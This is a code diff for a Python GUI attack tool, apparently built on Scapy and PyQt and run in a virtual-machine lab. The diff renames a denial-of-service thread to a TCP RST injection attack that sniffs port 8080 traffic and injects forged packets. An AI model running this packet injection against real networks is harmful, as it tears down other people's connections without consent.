@@ -40,7 +40,7 @@ def getFlags(F):
         f.append('CWR')
     return f
 
-class DoS(QThread):
+class Attack_RST(QThread):
     def __init__(self):
         QThread.__init__(self)
         self.textBox = None
@@ -66,11 +66,11 @@ class DoS(QThread):
         sniffing  = sniff(iface = "virbr0", filter = "port 8080", count = 2)
         flags = str(getFlags(sniffing[1][TCP].flags))
         if 'RST' in flags:
-            self.log_textBox.appendText("\nDoS successfull!\n")
+            self.log_textBox.appendText("\nRST attack successfull!\n")
         else:
-            self.log_textBox.appendText("\nDoS failed.\n")
+            self.log_textBox.appendText("\nRST attack failed.\n")
 
-    def attack_dos(self):
+    def attack(self):
         pacote = Ether()/IP()/TCP()
 
         # Ether
@@ -100,7 +100,7 @@ class DoS(QThread):
         self.inj(pacote, sniffing[0])
 
     def run(self):
-        self.attack_dos()
+        self.attack()
 
 class Sniffer(QThread):
 
@@ -279,17 +279,17 @@ if __name__ == "__main__":
     attack_label = QLabel('Attacks')
     grid.addWidget(attack_label, 2, 0)
 
-    # create DoS button
-    btn_dos = QPushButton('DoS (Ares)')
-    dos = DoS()
+    # create RST button
+    btn_rst = QPushButton('RST attack (Ares)')
+    rst = Attack_RST()
     @pyqtSlot()
     def on_click():
-        text_log.appendText("DoS starting...")
+        text_log.appendText("RST attack starting...")
         text_log.updateText()
-        dos.start()
+        rst.start()
 
-    grid.addWidget(btn_dos, 3, 0)
-    btn_dos.clicked.connect(on_click)
+    grid.addWidget(btn_rst, 3, 0)
+    btn_rst.clicked.connect(on_click)
 
 
     # create Load attack button
@@ -324,7 +324,7 @@ if __name__ == "__main__":
     text_log = TextBox()
     text_log.setEnabled(False)
     grid.addWidget(text_log, 6, 0)
-    w.connect(dos, SIGNAL("finished()"), text_log.updateText)
+    w.connect(rst, SIGNAL("finished()"), text_log.updateText)
 
     # original payload
     original_label = QLabel('Original payload:')
@@ -332,7 +332,7 @@ if __name__ == "__main__":
     text_original = TextBox()
     text_original.setEnabled(False)
     grid.addWidget(text_original, 6, 1)
-    w.connect(dos, SIGNAL("finished()"), text_original.updateText)
+    w.connect(rst, SIGNAL("finished()"), text_original.updateText)
 
     # new payload
     new_label = QLabel('New payload:')
@@ -340,9 +340,9 @@ if __name__ == "__main__":
     text_new = TextBox()
     text_new.setEnabled(False)
     grid.addWidget(text_new, 6, 2)
-    w.connect(dos, SIGNAL("finished()"), text_new.updateText)
+    w.connect(rst, SIGNAL("finished()"), text_new.updateText)
 
-    dos.setTextBox(text_log, text_original, text_new)
+    rst.setTextBox(text_log, text_original, text_new)
 
     # Show the window and run the app
     w.show()
